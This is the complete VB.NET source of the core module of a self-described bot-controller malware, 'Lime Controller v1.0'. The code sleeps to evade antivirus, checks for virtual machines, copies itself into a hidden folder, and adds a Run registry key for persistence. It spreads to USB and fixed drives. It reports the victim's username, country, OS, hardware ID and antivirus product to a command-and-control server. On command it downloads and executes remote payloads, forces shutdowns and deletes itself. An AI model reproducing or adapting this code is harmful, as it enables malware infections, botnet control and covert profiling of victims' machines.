Imports System.Windows.Forms
Imports System.IO
Imports System.Threading
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Management


'##################################################################
'##           N Y A N   C A T  ||  Last edit FEB/7/2018          ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'## Lime Controller v1.0 ..                                      ##
'## is a malware that act as bots controller ..                  ##
'## holding and saving bots then redirect them to main C&C ..    ##
'## also will copy itself to every USB and local driver ..       ##
'##                                                              ##
'## for educational purposes only ..                             ##
'## it's not for share nor sell ..                               ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##################################################################



Public Module Core
    Public ClientIP = LHOST
    Public LHOST As String = "%LHOST%"
    Public LHOST2 As String = "%LHOST%2"
    Public LPORT As Integer = "%LPORT%"
    Public LID As String = "%LID%"
    Public LKEY As String = ChrW(91) & ChrW(76) & ChrW(93)
    Public LVER As String = "Controller 1.0"
    Public LEXE As String = "%LEXE%"
    Public STUPNAME As String = "%STNAME%"
    Public NMT As Mutex = Nothing
    Public MTX As String = "%MUTEX%"
    Public SPDRIVER As Boolean = "%SPDRIVER%"
    Public SPUSB As Boolean = "%SPUSB%"
    Public ANTIV As Boolean = "%ANTIV%"
    Public DRCHK As Boolean = "%DRCHK%"
    Public DRPATH As String = "%DRPATH%"
    Public DRFOLDER As String = "%DRFOLDER%"
    Public Xsec As Integer = "0"
    Public SPUSB_TEXT As String
    Public NEXE As Object = New IO.FileInfo(Reflection.Assembly.GetExecutingAssembly.Location)
    Public S As New SK

    Public Sub Main()

        'sleep to try bypass av runtime
        Try
            If Xsec = "0" Then
                Thread.Sleep(2000)
            Else
                Thread.Sleep(Math.Round(Math.Round(Conversions.ToDouble(Xsec) * 1000.0)))
            End If
        Catch ex As Exception
        End Try

        ' b4 starting this shit lemme check if iam running twice
        Dim createdNew As Boolean
        NMT = New Mutex(True, MTX, createdNew)
        Try
            If Not createdNew Then Return
        Finally
            If createdNew Then
                NMT.ReleaseMutex()
            End If
        End Try

        'check anti
        If ANTIV Then
            Dim FKVM As New NoRun
            FKVM.RUN_CHECK()
        End If

        'lets drop
        Call DROP()

        'usb spread
        If SPUSB Then
            USB.ExeName = LEXE
            USB.Enable()
        Else
            SPUSB_TEXT = "Disabled"
        End If

        'fixed driver spread
        If SPDRIVER Then
            SPDRVE.SP_FIXED(LEXE)
        End If

        'final step, let's connect
        Dim START_CN As New Thread(New ThreadStart(AddressOf SK.RC), 1)
        START_CN.Start()

    End Sub

    Public Sub DROP()

        '##############################################
        '## For crypting please select inject itself ## 
        '##############################################

        ' let's check our file
        If Not IO.Path.GetExtension(LEXE) = ".exe" Then
            LEXE = LEXE & ".exe"
        End If

        'now let's drop this shit
        If DRCHK AndAlso Not CODR(NEXE, New FileInfo(Interaction.Environ(DRPATH).ToLower & "\" & DRFOLDER.ToLower & "\" & LEXE.ToLower)) Then
            Try
                If Not Directory.Exists(Interaction.Environ(DRPATH) & "\" & DRFOLDER) Then
                    Directory.CreateDirectory(Interaction.Environ(DRPATH) & "\" & DRFOLDER)
                ElseIf File.Exists(Interaction.Environ(DRPATH) & "\" & DRFOLDER & "\" & LEXE) Then
                    File.Delete(Interaction.Environ(DRPATH) & "\" & DRFOLDER & "\" & LEXE)
                End If
                'FileStream - it's better than copy
                Dim NF As New FileStream((Interaction.Environ(DRPATH) & "\" & DRFOLDER & "\" & LEXE), FileMode.CreateNew)
                Dim LEXEBYTES As Byte() = File.ReadAllBytes(NEXE.FullName)
                NF.Write(LEXEBYTES, 0, LEXEBYTES.Length)
                NF.Flush()
                NF.Close()
                NEXE = New FileInfo(Interaction.Environ(DRPATH) & "\" & DRFOLDER & "\" & LEXE)
                'Set Attrubutes
                File.SetAttributes(NEXE.FullName, FileAttributes.System + FileAttributes.Hidden)
                'Add startup reg
                Dim ADDREG As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
                Try : ADDREG.SetValue(STUPNAME, NEXE.FullName, Microsoft.Win32.RegistryValueKind.String) : Catch : End Try
                'Add persistence
                '[#DISABLED] Shell("schtasks /create /sc minute /mo 1 /tn " & STUPNAME & " /tr " & NEXE.FullName & "", AppWinStyle.Hide)
                'Last thing, exeucte
                Process.Start(NEXE.FullName)
                ProjectData.EndApp()
            Catch ex As Exception
            End Try
        End If

        'drop is false
        If Not DRCHK Then
            NEXE = New FileInfo(Reflection.Assembly.GetExecutingAssembly.Location)
        End If

        '[#DISABLED] My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", 0)

    End Sub

    Public Sub DEL()
        On Error Resume Next

        If DRCHK Then
            'set to normal
            File.SetAttributes(NEXE.FullName, FileAttributes.Normal)
            Thread.CurrentThread.Sleep(50)

            'delete startup paths reg
            Dim DELREG As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
            DELREG.DeleteValue(STUPNAME)
            Thread.CurrentThread.Sleep(50)

            'del schtask
            Shell("schtasks /Delete /tn " & STUPNAME & " /F", AppWinStyle.Hide)
            Thread.CurrentThread.Sleep(50)
        End If

        'final delete and close connection
        Shell(("cmd.exe /c ping 0 -n 2 & del """ & NEXE.FullName & """"), AppWinStyle.Hide, False, -1)
        ProjectData.EndApp()

    End Sub

    Private Function CODR(ByVal FILE1 As IO.FileInfo, ByVal FILE2 As IO.FileInfo) As Boolean ' Compare 2 path
        On Error Resume Next

        If FILE1.Name.ToLower <> FILE2.Name.ToLower Then Return False
        Dim DIR1 = FILE1.Directory
        Dim DIR2 = FILE2.Directory

        If DIR1.Name.ToLower = DIR2.Name.ToLower = False Then Return False
        DIR1 = DIR1.Parent
        DIR2 = DIR2.Parent
        If DIR1 Is Nothing And DIR2 Is Nothing Then Return True
        If DIR1 Is Nothing Then Return False
        If DIR2 Is Nothing Then Return False

    End Function

    Public Sub CMD(ByVal b As Byte())
        On Error Resume Next

        Dim DATA As String() = Split(B2S(b), LKEY)
        Select Case DATA(0)
            Case "PP"
                S.Send("PP")
         '###############################################################################
            Case "Close"
                ProjectData.EndApp()
            Case "Reconnect"
                Application.Restart()
                ProjectData.EndApp()
            Case "UpdateDisk"
                Dim NewFile = (IO.Path.GetTempFileName & "_" & DATA(1))
                IO.File.WriteAllBytes(NewFile, Convert.FromBase64String(DATA(2)))
                Threading.Thread.CurrentThread.Sleep(1000)
                Process.Start(NewFile)
                DEL()
            Case "UpdateURL"
                Dim NewFile = (Path.GetTempFileName & ".exe")
                My.Computer.Network.DownloadFile(DATA(1), NewFile)
                Threading.Thread.CurrentThread.Sleep(1000)
                Process.Start(NewFile)
                DEL()
            Case "Uni"
                DEL()
         '###############################################################################
            Case "RunDisk"
                Dim NewFile = (IO.Path.GetTempFileName & "_" & DATA(1))
                IO.File.WriteAllBytes(NewFile, Convert.FromBase64String(DATA(2)))
                Threading.Thread.CurrentThread.Sleep(1000)
                Process.Start(NewFile)
            Case "RunURL"
                Dim NewFile = (Path.GetTempFileName & Path.GetExtension(DATA(1)))
                My.Computer.Network.DownloadFile(DATA(1), NewFile)
                Threading.Thread.CurrentThread.Sleep(1000)
                Process.Start(NewFile)
         '###############################################################################
            Case "Logoff"
                Shell("shutdown -l -t 00 -f", AppWinStyle.Hide)
            Case "Restart"
                Shell("shutdown -r -t 00 -f", AppWinStyle.Hide)
            Case "Shutdown"
                Shell("shutdown -s -t 00 -f", AppWinStyle.Hide)

        End Select
    End Sub

    Public Function Hello() As String
        On Error Resume Next
        Dim LV As String

        'ID
        LV &= LID & "_" & HWID() & LKEY

        ' get User name
        LV &= Environment.UserName & LKEY

        'stub name
        LV &= Path.GetFileName(NEXE.Name) & LKEY

        ' get Country
        LV &= GLOC() & LKEY

        ' Get OS
        LV += GOS() & LKEY

        ' version
        LV &= LVER & LKEY

        ' Install Date
        LV &= INDATE() & LKEY

        ' check spread
        LV &= SPUSB_TEXT & LKEY

        'AV name
        LV &= GAV() & LKEY

        Return LV
    End Function

    Public Function INDATE() As String ' install Date
        Try
            Return CType(NEXE, IO.FileInfo).LastWriteTime.ToString("dd/MM/yyy hh:mm tt")
        Catch ex As Exception
            Return "N/A"
        End Try
    End Function

    Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    Function HWID() As String
        Try
            Dim sn As Integer
            GetVolumeInformation(Environ("SystemDrive") & "\", Nothing, Nothing, sn, 0, 0, Nothing, Nothing)
            Return (Hex(sn))
        Catch ex As Exception
            Return "N/A"
        End Try
    End Function

    Function GAV() As String
        Try
            Dim AV_NAME As String = Nothing
            Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM AntivirusProduct")
            Dim instances As ManagementObjectCollection = searcher.[Get]()
            For Each queryObj As ManagementObject In instances
                AV_NAME = queryObj("displayName").ToString()
            Next
            If AV_NAME = String.Empty Then AV_NAME = "N/A"
            AV_NAME = "" & AV_NAME.ToString
            Return AV_NAME
            searcher.Dispose()
        Catch
            Return "N/A"
        End Try
    End Function

    Public Function B2S(ByVal b As Byte()) As String ' bytes to String
        Return System.Text.Encoding.Default.GetString(b)
    End Function

    Public Function S2B(ByVal s As String) As Byte() ' String to bytes
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function

    Function SB2W(ByVal b As Byte(), ByVal WRD As String) As Array ' split bytes by word
        Dim asdf As New List(Of Byte())
        Dim M1 As New IO.MemoryStream
        Dim M2 As New IO.MemoryStream
        Dim NC As String() = Split(B2S(b), WRD)
        M1.Write(b, 0, NC(0).Length)
        M2.Write(b, NC(0).Length + WRD.Length, b.Length - (NC(0).Length + WRD.Length))
        asdf.Add(M1.ToArray)
        asdf.Add(M2.ToArray)
        M1.Dispose()
        M2.Dispose()
        Return asdf.ToArray
    End Function

    ' Country
    Public Function GLOC() As String
        Try
            Return Globalization.RegionInfo.CurrentRegion.EnglishName()
        Catch ex As Exception
            Return "Unknown"
        End Try
    End Function
    'os
    Public Function GOS()
        Try
            Return My.Computer.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win")
        Catch ex As Exception
            Return "Unknown"
        End Try
    End Function

End Module
